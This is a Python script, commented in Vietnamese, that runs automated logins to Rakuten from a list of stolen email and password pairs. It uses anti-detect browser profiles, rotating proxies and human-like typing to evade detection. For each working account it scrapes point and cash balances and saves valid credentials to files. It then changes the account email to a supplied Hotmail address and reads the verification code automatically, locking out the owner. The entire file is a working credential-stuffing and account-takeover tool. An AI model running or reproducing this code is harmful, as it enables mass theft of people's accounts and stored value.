import time
import random
import logging
import threading
from queue import Queue
import os
import colorama
from datetime import datetime
import signal
import sys
import atexit
import shutil
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
from fake_useragent import UserAgent
import re
import html
colorama.init()

# Global variables
successful_accounts = []
hotmail_need_deletes = []
failed_accounts = []
browsers = []
stop_event = threading.Event()
failed_start_profile_count = 0

class GPMLoginAPI:
    def __init__(self):
        self.base_url = self.read_config_url()
        self.session = requests.Session()
    def read_config_url(self):
        try:
            with open('config.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        return line
            # Default fallback if file is empty or only comments
            return "http://127.0.0.1:18700"
        except FileNotFoundError:
            logging.warning("config.txt not found, using default URL: http://127.0.0.1:18700")
            return "http://127.0.0.1:18700"
        except Exception as e:
            logging.error(f"Error reading config.txt: {repr(e)}, using default URL")
            return "http://127.0.0.1:18700"
    def create_profile(self, proxy, name):
        # Tạo cấu hình mới với proxy HTTP và hệ điều hành Android
        payload = {
            "profile_name": f"{name}_{random.randint(1000, 9999)}",
            "group_name": "All",
            "browser_core": "chromium",
            "browser_name": "Chrome",
            "browser_version": "139.0.7258.139",
            "is_random_browser_version": False,
            "raw_proxy": f"{proxy}" if proxy else "",
            "startup_urls": "",
            "is_masked_font": True,
            "is_noise_canvas": False,
            "is_noise_webgl": False,
            "is_noise_client_rect": False,
            "is_noise_audio_context": True,
            "is_random_screen": False,
            "is_masked_webgl_data": True,
            "is_masked_media_device": True,
            "is_random_os": False,
            "os": "Windows 11",
            "webrtc_mode": 2,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        }
        response = self.session.post(f"{self.base_url}/api/v3/profiles/create", json=payload)
        if response.status_code == 200 and response.json().get("success"):
            return response.json().get("data", {}).get("id")
        logging.error(f"CẢNH BÁO: Không tạo được cấu hình với proxy {proxy}")
        return None
    
    def start_profile(self, profile_id, x=None, y=None, w=None, h=None):
        global failed_start_profile_count
        # Khởi động trình duyệt cho cấu hình
        response = self.session.get(f"{self.base_url}/api/v3/profiles/start/{profile_id}?win_pos=0,0")
        if response.status_code == 200 and response.json().get("success"):
            return response.json().get("data", {})
        logging.error(f"CẢNH BÁO: Không khởi động được cấu hình {profile_id} {response.json().get('message')}")
        failed_start_profile_count += 1
        if (failed_start_profile_count >= 10):
            stop_event.set()
            time.sleep(5)
            os._exit(1)
        return None

    def close_profile(self, profile_id):
        # Đóng trình duyệt
        response = self.session.get(f"{self.base_url}/api/v3/profiles/close/{profile_id}")
        if response.status_code == 200 and response.json().get("success"):
            return response.json().get("data", {})
        logging.error(f"CẢNH BÁO: Không đóng được cấu hình {profile_id} {response.json().get('message')}")
        return None

    def delete_profile(self, profile_id):
        # Xoá cấu hình
        response = self.session.delete(f"{self.base_url}/api/v3/profiles/delete/{profile_id}?mode=2")
        if response.status_code == 200 and response.json().get("success"):
            return response.json().get("data", {})
        logging.error(f"CẢNH BÁO: Không xoá được cấu hình {profile_id} {response.json().get('message')}")
        return None

def cleanup_browsers():
    """Dọn dẹp tất cả các Browser instances."""
    logging.warning("Đang dọn dẹp browsers...")
    global browsers
    for driver in browsers[:]:
        try:
            driver.quit()
        except Exception as e:
            logging.warning(f"Lỗi khi đóng browser: {e}")
        finally:
            if driver in browsers:
                browsers.remove(driver)

def signal_handler(sig, frame):
    """Xử lý SIGINT (Ctrl+C) và SIGTERM (đóng terminal)."""
    logging.info("Nhận tín hiệu dừng. Đang dọn dẹp...")
    cleanup_browsers()
    logging.info("Dọn dẹp hoàn tất. Thoát...")
    sys.exit(0)

# Setup logging
COLOR_RESET = '\033[0m'
COLOR_INFO = '\033[32m'    # Green
COLOR_WARNING = '\033[33m' # Yellow
COLOR_ERROR = '\033[31m'   # Red

class ColorFormatter(logging.Formatter):
    def format(self, record):
        color = ''
        if record.levelno == logging.INFO:
            color = COLOR_INFO
        elif record.levelno == logging.WARNING:
            color = COLOR_WARNING
        elif record.levelno == logging.ERROR:
            color = COLOR_ERROR
        msg = super().format(record)
        return f"{color}{msg}{COLOR_RESET}"
    
    def formatTime(self, record, datefmt=None):
        dt = datetime.fromtimestamp(record.created)
        return dt.strftime("%H:%M")

# Create stream handler with color
console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorFormatter(
    '%(asctime)s - %(levelname)s - %(message)s'
))

# File handler without color
file_handler = logging.FileHandler('rakuten_automation.log', encoding='utf-8')
file_handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s'
))

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)

# Hide verbose logs
logging.getLogger('selenium').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Global variables
file_lock = threading.Lock()

def load_input_files():
    """Tải tài khoản từ accounts.txt và proxy từ proxy.txt"""
    try:
        accounts = []
        with open('accounts.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        accounts.append({
                            'email': parts[0].strip(),
                            'password': parts[1].strip()
                        })

        hotmails = []
        with open('hotmail.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    line = line.strip()
                    hotmails.append(line)
        
        # Load proxies (optional)
        proxies = []
        try:
            with open('proxy.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Handle different proxy formats
                        if '@' in line:
                            # Format: host:port@username:password
                            try:
                                host_port, credentials = line.split('@', 1)
                                if ':' in credentials:
                                    username, password = credentials.split(':', 1)
                                else:
                                    username, password = credentials, ""
                                
                                proxies.append({
                                    'server': f"http://{host_port}",
                                    'username': username,
                                    'password': password,
                                    'full': line
                                })
                            except Exception as e:
                                logging.warning(f"Không thể parse proxy: {line} - {e}")
                        else:
                            # Handle format: host:port:username:password or host:port
                            parts = line.split(':')
                            if len(parts) >= 4:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': parts[2],
                                    'password': parts[3],
                                    'full': line
                                })
                            elif len(parts) >= 2:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': None,
                                    'password': None,
                                    'full': line
                                })
        except FileNotFoundError:
            logging.warning("proxy.txt không tìm thấy. Chạy mà không dùng proxy.")
        
        if not accounts:
            logging.error("Không tìm thấy tài khoản hợp lệ trong accounts.txt")
            raise ValueError("Không có tài khoản để xử lý")
        
        logging.info(f"Đã tải {len(accounts)} tài khoản và {len(proxies)} proxy")
        return accounts, proxies, hotmails
    
    except Exception as e:
        logging.error(f"Lỗi khi tải file đầu vào: {repr(e)}")
        raise
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service


def init_browser_with_gpm(gpm_api, proxy, email):
    """Khởi tạo Selenium browser với GPM API"""
    try:
        # Create profile with proxy
        profile_id = gpm_api.create_profile(proxy, email)
        if not profile_id:
            return None, None        
        # Start profile
        profile_data = gpm_api.start_profile(profile_id)
        if not profile_data:
            gpm_api.delete_profile(profile_id)
            return None, None
        # Get remote debugging address
        remote_debugging_address = profile_data.get("remote_debugging_address")
        if not remote_debugging_address:
            logging.error("Không lấy được remote debugging address")
            gpm_api.close_profile(profile_id)
            gpm_api.delete_profile(profile_id)
            return None, None
        service = Service(ChromeDriverManager(driver_version="139.0.7258.139").install())
        # Setup Chrome options for remote debugging
        chrome_options = Options()
        chrome_options.add_experimental_option("debuggerAddress", remote_debugging_address)
        driver = webdriver.Chrome(service=service, options=chrome_options)

        return driver, profile_id
        
    except Exception as e:
        logging.error(f"Lỗi khởi tạo browser với GPM: {e}")
        if profile_id:
            gpm_api.close_profile(profile_id)
            gpm_api.delete_profile(profile_id)
        return None, None

def human_type(driver, element, text, min_delay=0.05, max_delay=0.15):
    """Type text with human-like delay using Selenium"""
    element.clear()
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(min_delay, max_delay))

def _remove_account_from_file(email):
    """Remove account from accounts.txt file"""
    try:
        with file_lock:
            with open('accounts.txt', 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            with open('accounts.txt', 'w', encoding='utf-8') as f:
                for line in lines:
                    if line.strip() and not line.startswith('#'):
                        parts = line.strip().split(':')
                        if len(parts) >= 1 and parts[0].strip() != email:
                            f.write(line)
                    else:
                        f.write(line)
            logging.debug(f"🗑️ Đã xóa {email} khỏi accounts.txt")
    except Exception as e:
        logging.warning(f"Không thể xóa {email} khỏi accounts.txt: {e}")

def check_rakuten_account(driver, email, password, hot_mail=None):
    """Kiểm tra tài khoản Rakuten với Selenium"""
    try:
        logging.info(f"Bắt đầu kiểm tra tài khoản: {email}")
        
        # Navigate to login page with retry logic
        login_url = ("https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in")
        
        # Try to navigate with retry mechanism
        max_retries = 3
        for attempt in range(max_retries):
            try:
                driver.get(login_url)
                WebDriverWait(driver, 30).until(
                    lambda d: d.execute_script("return document.readyState") == "complete"
                )
                logging.debug(f"Successfully navigated to login page for {email} (attempt {attempt + 1})")
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    logging.debug(f"Failed to navigate to login page for {email} after {max_retries} attempts: {repr(e)}")
                    raise
                else:
                    logging.debug(f"Navigation attempt {attempt + 1} failed for {email}, retrying... Error: {repr(e)}")
                    time.sleep(5)

        time.sleep(random.randint(2, 5))
        
        # Step 1: Enter email
        if not _enter_email(driver, email):
            result = False, f"Lỗi nhập email cho {email}"
        # Step 2: Enter password
        elif not _enter_password(driver, password):
            result = False, f"Lỗi nhập password cho {email}"
        # Step 3: Check login success
        elif not _check_login_success(driver, email):
            result = False, "Đăng nhập thất bại"
        else:
            # Step 4: Check points
            result = _check_points(driver, email, password)
            # Step 5: Change Email
            if hot_mail:
                _change_email(driver, email, password, hot_mail)
        
        _remove_account_from_file(email)        
        return result
            
    except Exception as e:
        logging.error(f"❌ Lỗi trong quá trình kiểm tra cho {email}: {repr(e)}")
        # Remove account even if there's an exception
        _remove_account_from_file(email)
        return False, repr(e)

def _enter_email(driver, email):
    """Enter email in login form using Selenium"""
    try:
        # Wait for email input field
        email_input = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )
        
        # Type email with human-like delay
        human_type(driver, email_input, email)
        time.sleep(random.randint(1, 2))
        
        # Click first submit button (Next)
        next_button = driver.find_element(By.ID, "cta001")
        next_button.click()
        time.sleep(random.randint(2, 4))
        
        return True
        
    except Exception as e:
        logging.debug(f"Lỗi khi nhập email: {repr(e)}")
        return False

def _enter_password(driver, password):
    """Enter password in login form using Selenium"""
    try:
        # Wait for password input field
        password_input = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.NAME, "password"))
        )
        
        # Type password with human-like delay
        human_type(driver, password_input, password)
        time.sleep(random.randint(1, 2))
        
        # Click second submit button (Next)
        submit_button = driver.find_element(By.ID, "cta011")
        submit_button.click()
        
        # Wait for login to process
        time.sleep(5)
        
        return True
        
    except Exception as e:
        debug_folder = "debug_output"
        os.makedirs(debug_folder, exist_ok=True)
        
        logging.error(f"Không tìm thấy ô password. Bắt đầu thu thập bằng chứng...")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(debug_folder, f"debug_screenshot_{timestamp}.png")
        driver.save_screenshot(screenshot_path)
        logging.info(f"Đã lưu ảnh chụp màn hình lỗi tại: {screenshot_path}")
        html_path = os.path.join(debug_folder, f"debug_page_{timestamp}.html")
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(driver.page_source)
        logging.info(f"Đã lưu mã HTML của trang lỗi tại: {html_path}")
        return False

def _check_login_success(driver, email):
    """Check if login was successful using Selenium"""
    try:
        # Wait for potential redirect to rakuten.co.jp domain
        WebDriverWait(driver, 30).until(
            lambda d: "rakuten.co.jp" in d.current_url
        )
        
        time.sleep(10)
        current_url = driver.current_url
        
        # If still on login page, login failed
        if "login.account.rakuten.com" in current_url:
            # Check for error messages
            try:
                error_elements = driver.find_elements(By.CSS_SELECTOR, ".error, .alert, [class*='error'], [class*='alert']")
                if error_elements:
                    error_text = error_elements[0].text
                    logging.debug(f"Đăng nhập thất bại cho {email}: {error_text}")
                    return False
            except:
                pass
            
            # logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
            return False
        
        return True
        
    except TimeoutException:
        logging.debug(f"Timeout chờ redirect cho {email}")
        return False
    except Exception as e:
        logging.debug(f"Lỗi kiểm tra đăng nhập cho {email}: {repr(e)}")
        return False

def _check_points(driver, email, password):
    """Check points information and save to appropriate file using Selenium"""
    try:
        # Navigate to points page with retry
        points_url = "https://point.rakuten.co.jp/?l-id=top_normal_myrakuten_point"
        
        def goto_link(url):
            max_retries = 2
            for attempt in range(max_retries):
                try:
                    driver.get(url)
                    WebDriverWait(driver, 15).until(
                        lambda d: d.execute_script("return document.readyState") == "complete"
                    )
                    break
                except Exception as e:
                    if attempt == max_retries - 1:
                        logging.debug(f"Failed to navigate to points page for {email}: {repr(e)}")
                        return True, f"Đăng nhập thành công nhưng không thể truy cập trang điểm : {url}"
                    else:
                        logging.debug(f"Points page navigation attempt {attempt + 1} failed for {email}, retrying...")
                        time.sleep(3)

        goto_link(points_url)
        
        points_details = []
        
        try:
            try:
                held_points_element = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, ".point-total dd"))
                )
                held_points_text = held_points_element.text.strip()
                held_points_clean = ''.join(filter(str.isdigit, held_points_text))
                if held_points_clean:
                    held_points_value = int(held_points_clean)
                    points_details.append(f"Total Point: {held_points_value:,}")
                    logging.debug(f"📊 {email} - Points total: {held_points_value:,}")
            except TimeoutException:
                logging.debug(f"Không tìm thấy 'Points total' cho {email}")

            try:
                operation_points_element = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, ".point-gadget-display-point .point_num"))
                )
                operation_points_text = operation_points_element.text.strip()
                operation_points_clean = ''.join(filter(str.isdigit, operation_points_text))
                if operation_points_clean:
                    operation_points_value = int(operation_points_clean)
                    points_details.append(f"Operation: {operation_points_value:,}")
                    logging.debug(f"📈 {email} - Points in operation: {operation_points_value:,}")
            except TimeoutException:
                logging.debug(f"Không tìm thấy 'Points in operation' cho {email}")

            try:
                add_points_element = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "#js-pointBankTotalBalance .point_num"))
                )
                add_points_text = add_points_element.text.strip()
                add_points_clean = ''.join(filter(str.isdigit, add_points_text))
                if add_points_clean:
                    add_points_value = int(add_points_clean)
                    points_details.append(f"Add: {add_points_value:,}")
                    logging.debug(f"➕ {email} - Points add: {add_points_value:,}")
            except TimeoutException:
                logging.debug(f"Không tìm thấy 'Points add' cho {email}")

            goto_link("https://my.rakuten.co.jp/?l-id=pc_footer_account")
            time.sleep(3)

            try:
                cash_points_element = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, '[data-ratid="available-rcash-area"] span:nth-child(2)'))
                )
                cash_points_text = cash_points_element.text.strip()
                cash_points_clean = ''.join(filter(str.isdigit, cash_points_text))
                if cash_points_clean:
                    cash_points_value = int(cash_points_clean)
                    points_details.append(f"Cash: {cash_points_value:,}")
                    logging.debug(f"💰 {email} - Cash Point: {cash_points_value:,}")
            except TimeoutException:
                logging.debug(f"Không tìm thấy 'Cash Point' cho {email}")

            if len(points_details) > 0:
                points_summary = " | ".join(points_details)
                logging.info(f"✅ {email} - ({points_summary})")
                
                # Save to appropriate file based on points
                with file_lock:
                    with open('point_account.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}|{password}|{points_summary}\n")
                    return True, f"Có điểm: ({points_summary})"
            else:
                logging.info(f"📭 {email} - Không có điểm")
                with file_lock:
                    with open('no_point_account.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}|{password}|0\n")
                    return True, "Không có điểm"
                
        except Exception as e:
            logging.debug(f"Không tìm thấy thông tin điểm cho {email}: {repr(e)}")
            # Still consider login successful even if can't read points
            return True, "Đăng nhập thành công nhưng không tìm thấy điểm"
            
    except Exception as e:
        logging.debug(f"Lỗi khi kiểm tra điểm cho {email}: {repr(e)}")
        return True, "Đăng nhập thành công nhưng lỗi kiểm tra điểm"




def extract_otp_from_html(html_content):
    if not html_content:
        return None

    # Normalize / unescape
    s = html.unescape(html_content)

    # --- Original methods kept first (preserve behaviour) ---
    pattern1 = r'your verification code is:</span></div></td></tr>.*?<div[^>]*><span>(\d{6})</span></div>'
    m = re.search(pattern1, s, re.IGNORECASE | re.DOTALL)
    if m:
        return m.group(1).strip()

    pattern2 = r'verification code.*?(\d{6})'
    m = re.search(pattern2, s, re.IGNORECASE | re.DOTALL)
    if m:
        return m.group(1).strip()

    # Find 6-digit codes but exclude hex color codes
    pattern3 = r'\b(\d{6})\b'
    for match in re.finditer(pattern3, s):
        # Get the position and the 6-digit code
        start_pos = match.start()
        end_pos = match.end()
        six_digit_code = match.group(1)
        
        # Check if it's part of a color code by looking at characters before it
        prefix = s[max(0, start_pos-1):start_pos]
        if prefix == '#':
            # Skip this match as it's likely a color code
            continue
            
        # Also check for "color code" text nearby (20 chars before)
        nearby_text = s[max(0, start_pos-20):start_pos].lower()
        if 'color' in nearby_text and 'code' in nearby_text:
            # Skip this match as it's described as a color code
            continue
            
        # If we got here, it's not a color code, so return it
        return six_digit_code.strip()
        
    return None

from hotmail import Hotmail

def _get_otp_from_hotmail(hotmail, otp_code = None):
    hotmail.get_access_token()
    try:
            for _ in range(30):
                try:
                    messages = hotmail.get_messages()
                    for msg in messages:
                        otp = extract_otp_from_html(msg)
                        if otp and str(otp) != str(otp_code):
                            logging.info(f"✅ Lấy OTP thành công: {otp}")
                            return otp
                except:
                    pass
                time.sleep(random.uniform(5, 15))
            return None
    except Exception as e:
            logging.error(f"CẢNH BÁO: Lỗi khi gọi API OTP: {str(e)}")
            return None

def _change_email(driver, email, password, hotmail):
    new_email, password, refresh_token, client_id = hotmail.split('|')
    try:
        driver.get("https://profile.id.rakuten.co.jp/account-security")
        time.sleep(5)
        change_btn = driver.find_element(By.CSS_SELECTOR, "[data-qa-id=\"email-edit-field\"]")
        change_btn.click()
        time.sleep(3)
        email_input = driver.find_element(By.NAME, "email")
        human_type(driver, email_input, new_email)
        # data-qa-id="submit-update-email"
        submit_btn = driver.find_element(By.CSS_SELECTOR, "[data-qa-id=\"submit-update-email\"]")
        submit_btn.click()
        
        hotmail = Hotmail(email, password, refresh_token, client_id)
        time.sleep(15)
        otp_code = _get_otp_from_hotmail(hotmail)
        # id="VerifyCode"
        otp_input = WebDriverWait(driver, 60).until(
            EC.presence_of_element_located((By.ID, "VerifyCode"))
        )
        human_type(driver, otp_input, otp_code)
        time.sleep(2)
        # id="submit"
        verify_btn = driver.find_element(By.ID, "submit")
        verify_btn.click()

    except Exception as e:
        logging.debug(f"Lỗi khi đổi email cho {email}: {repr(e)}")
        return
def process_account(gpm_api, account, account_index, proxy_info, hotmails):
    """Xử lý một tài khoản với GPM API"""
    email, password = account['email'], account['password']
    driver = None
    profile_id = None
    hotmail = hotmails[account_index % len(hotmails)] if len(hotmails) > 0 else None
    
    try:
        logging.debug(f"Đang xử lý tài khoản {account_index + 1}: {email}")
        
        # Initialize browser with GPM
        driver, profile_id = init_browser_with_gpm(gpm_api, proxy_info.get('full') if proxy_info else None, email)
        if not driver:
            raise Exception("Không thể khởi tạo browser với GPM")
        
        browsers.append(driver)

        success, message = check_rakuten_account(driver, email, password, hotmail)
        if not success:
            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
        else:
            hotmail_need_deletes.append(hotmail)
            
        with file_lock:
            if success:
                successful_accounts.append(account)
                # Lưu tài khoản thành công
                with open('successful_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}|{hotmail}\n")
            else:
                failed_accounts.append({'account': account, 'error': message})
                # Lưu tài khoản thất bại
                with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}|{hotmail}\n")
        logging.info(f"Hoàn tất xử lý tài khoản: {email}")
        
    except Exception as e:
        logging.error(f"Lỗi xử lý tài khoản {email}: {repr(e)}")
        with file_lock:
            failed_accounts.append({'account': account, 'error': repr(e)})
            with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}|{password}|{'Acc lock hoặc lỗi pass'}\n")
    finally:
        # Cleanup browser and profile
        try:
            if driver:
                driver.quit()
                if driver in browsers:
                    browsers.remove(driver)
            if profile_id:
                gpm_api.close_profile(profile_id)
                gpm_api.delete_profile(profile_id)

            # remove hotmail.txt if used
            if hotmail and hotmail in hotmail_need_deletes:
                hotmail_need_deletes.remove(hotmail)
                try:
                    with file_lock:
                        with open('hotmail.txt', 'r', encoding='utf-8') as f:
                            lines = f.readlines()
                        
                        with open('hotmail.txt', 'w', encoding='utf-8') as f:
                            for line in lines:
                                if line.strip() and not line.startswith('#'):
                                    if line.strip() != hotmail:
                                        f.write(line)
                                else:
                                    f.write(line)
                        # logging.debug(f"🗑️ Đã xóa {hotmail} khỏi hotmail.txt")
                except Exception as e:
                    pass
        except Exception as e:
            logging.debug(f"Lỗi khi đóng browser/profile: {e}")

def check_key_live():
    """Kiểm tra key có live không từ GitHub"""
    try:
        trial_url = "https://raw.githubusercontent.com/sang2770/storage/master/trial.json"
        
        logging.info("Đang kiểm tra key live...")
        response = requests.get(trial_url, timeout=10)
        
        if response.status_code == 404:
            logging.error("❌ Key đã hết hạn hoặc không tồn tại (404).")
            print("\n" + "="*50)
            print("🔑 KEY ĐÃ HẾT HẠN HOẶC KHÔNG TỒN TẠI")
            print("Vui lòng liên hệ để gia hạn key.")
            print("="*50)
            return False
        elif response.status_code == 200:
            logging.info("✅ Key live - Cho phép chạy chương trình.")
            return True
        else:
            logging.warning(f"⚠️ Không thể kiểm tra key (HTTP {response.status_code}). Tiếp tục chạy...")
            return True
            
    except requests.exceptions.Timeout:
        logging.warning("⚠️ Timeout khi kiểm tra key. Tiếp tục chạy...")
        return True
    except requests.exceptions.ConnectionError:
        logging.warning("⚠️ Không có kết nối internet. Tiếp tục chạy...")
        return True
    except Exception as e:
        logging.warning(f"⚠️ Lỗi khi kiểm tra key: {repr(e)}. Tiếp tục chạy...")
        return True

def main():
    # Check if key is live before proceeding
    if not check_key_live():
        logging.error("Dừng chương trình do key không hợp lệ.")
        input("Nhấn Enter để thoát...")
        sys.exit(1)
    
    try:
        # Initialize GPM API
        gpm_api = GPMLoginAPI()
        
        # Load input files
        accounts, proxies, hotmails = load_input_files()
        
        # Get number of threads
        try:
            num_threads = int(input("Nhập số luồng để chạy: "))
            if num_threads <= 0:
                logging.warning("Số luồng phải là số dương. Đặt mặc định là 1.")
                num_threads = 1
            if num_threads > len(accounts):
                logging.warning(f"Số luồng ({num_threads}) vượt quá số tài khoản ({len(accounts)}). Đặt thành {len(accounts)}.")
                num_threads = len(accounts)
        except ValueError:
            logging.warning("Đầu vào số luồng không hợp lệ. Đặt mặc định là 1.")
            num_threads = 1                
        # Setup account queue
        account_queue = Queue()
        
        # Add accounts to queue
        for idx, account in enumerate(accounts):
            account_queue.put((account, idx))
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        def worker():
            """Hàm worker thread"""
            while not account_queue.empty() and not stop_event.is_set():
                try:
                    account, account_index = account_queue.get()
                    proxy_info = proxies[account_index % len(proxies)] if len(proxies) > 0 else None
                    
                    # Debug logging for proxy
                    if proxy_info:
                        logging.debug(f"Using proxy for {account['email']}: {proxy_info}")
                    
                    process_account(gpm_api, account, account_index, proxy_info, hotmails)

                except Exception as e:
                    logging.error(f"Lỗi trong worker thread: {repr(e)}")
                    # Log the account as failed
                    with file_lock:
                        failed_accounts.append({'account': account, 'error': repr(e)})
                        with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{account['email']}|{account['password']}|{repr(e)}\n")
                
                finally:
                    account_queue.task_done()
        
        # Start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker, name=f"Luồng-{i+1}")
            t.start()
            threads.append(t)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        # Báo cáo cuối cùng
        logging.info("Đã xử lý xong tất cả tài khoản.")
        logging.info(f"✅ Đăng ký thành công: {len(successful_accounts)}")
        logging.info(f"❌ Đăng ký thất bại: {len(failed_accounts)}")
        
        logging.info("Chương trình hoàn tất. Thoát sau 5 giây...")
        time.sleep(5)
        
    except Exception as e:
        logging.error(f"Lỗi trong hàm main: {repr(e)}")
    finally:
        cleanup_browsers()
        if len(hotmail_need_deletes) > 0:
                try:
                    with file_lock:
                        with open('hotmail.txt', 'r', encoding='utf-8') as f:
                            lines = f.readlines()
                        
                        with open('hotmail.txt', 'w', encoding='utf-8') as f:
                            for line in lines:
                                if line.strip() and not line.startswith('#'):
                                    if line.strip() not in hotmail_need_deletes:
                                        f.write(line)
                                else:
                                    f.write(line)
                        # logging.debug(f"🗑️ Đã xóa {hotmail} khỏi hotmail.txt")
                except Exception as e:
                    pass

if __name__ == "__main__":
    try:
        signal.signal(signal.SIGTERM, cleanup_browsers)
        signal.signal(signal.SIGINT, cleanup_browsers)
        atexit.register(cleanup_browsers)
        main()
    except KeyboardInterrupt:
        logging.info("Nhận KeyboardInterrupt. Đang dọn dẹp...")
        cleanup_browsers()
        logging.info("Dọn dẹp hoàn tất. Thoát...")
        sys.exit(0)
